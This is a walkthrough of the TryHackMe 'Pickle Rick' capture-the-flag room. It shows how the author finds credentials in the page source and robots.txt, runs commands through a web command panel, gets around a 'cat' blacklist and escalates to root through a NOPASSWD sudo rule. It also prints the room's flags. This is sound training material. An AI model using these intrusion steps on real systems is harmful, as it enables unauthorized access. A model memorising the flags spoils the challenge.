# Pickle Rick

- **Room:** Pickle Rick (TryHackMe)
- **Link:** https://tryhackme.com/room/picklerick
- **Category:** Web Exploitation
- **Difficulty:** Easy
- **Date completed:** 9th of September 2026

## Summary

A Rick and Morty themed room. Rick has turned himself into a pickle again and needs help finding three secret ingredients to reverse the potion. The whole thing runs through a vulnerable web app - from finding creds in the page source, to a command injection panel, to a straight-up root privilege escalation through a bad sudo config.

## Walkthrough

### Step 1: Initial look at the site

Visiting the target IP shows a Rick and Morty themed page with a message from Rick asking Morty to log in to his computer and find the three secret ingredients, since he can't remember the password.

### Step 2: Checking the page source

Viewing the page source turned up a comment left behind:

```
Username: R1ckRul3s
```

Username found, password still unknown.

### Step 3: Directory discovery

Ran a gobuster scan to find hidden pages:

```
gobuster dir -u http://10.130.136.243 -w /usr/share/wordlists/dirb/common.txt -x txt,php,html
```

This turned up `/login.php`.

### Step 4: robots.txt

Also checked robots.txt directly:

```
curl http://10.130.136.243/robots.txt
```

It returned the line "Wubbalubbadubdub" - which turned out to be the password.

### Step 5: Logging in

Logged in to `/login.php` with:

- Username: `R1ckRul3s`
- Password: `Wubbalubbadubdub`

This dropped into a Command Panel on `portal.php` - a web-based text box that runs OS commands on the server.

### Step 6: Confirming command execution

Ran a basic command to check what user the panel was executing as:

```
whoami
```

Result: `www-data`. Confirmed command injection with low-privilege shell access.

### Step 7: Finding the second ingredient

Searched the filesystem for anything related to the ingredients:

```
find / -iname "*ingredient*" 2>/dev/null
```

This turned up `/home/rick/second ingredients`. Trying to read it with `cat` got blocked - the panel had `cat` blacklisted. Used `less` instead:

```
less "/home/rick/second ingredients"
```

Result: **1 jerry tear**.

### Step 8: Finding the first ingredient

Checked the web root for other files sitting alongside the app:

```
ls -la /var/www/html
```

Found `Sup3rS3cretPickl3Ingred.txt` sitting right there. Read it with `less`:

```
less /var/www/html/Sup3rS3cretPickl3Ingred.txt
```

Result: **Mr. Meeseeks hair**.

### Step 9: Privilege escalation

A `clue.txt` file in the web root hinted that the last ingredient needed more digging elsewhere on the filesystem. Checked sudo permissions for the current user:

```
sudo -l
```

Result:

```
User www-data may run the following commands on ip-10-130-136-243:
    (ALL) NOPASSWD: ALL
```

`www-data` could run any command as root with no password required - a straight path to full root access.

### Step 10: Finding the third ingredient

With root access available, checked root's home directory:

```
sudo ls -la /root
```

Found `3rd.txt`. Read it:

```
sudo less /root/3rd.txt
```

Result: **fleeb juice**.

## Ingredients Found

- **1st ingredient:** Mr. Meeseeks hair
- **2nd ingredient:** 1 jerry tear
- **3rd ingredient:** fleeb juice

## Lessons Learned

- Always check page source early - creds and comments left behind by devs are a common easy win.
- A command injection panel is basically a shell in disguise - treat it like one and enumerate the same way you would after popping a real shell.
- Command blacklists (like blocking `cat`) are rarely a real barrier - there's almost always another binary or a syntax trick that does the same job.
- Always run `sudo -l` after landing a shell. A `NOPASSWD: ALL` misconfig is one of the fastest and most common routes to root.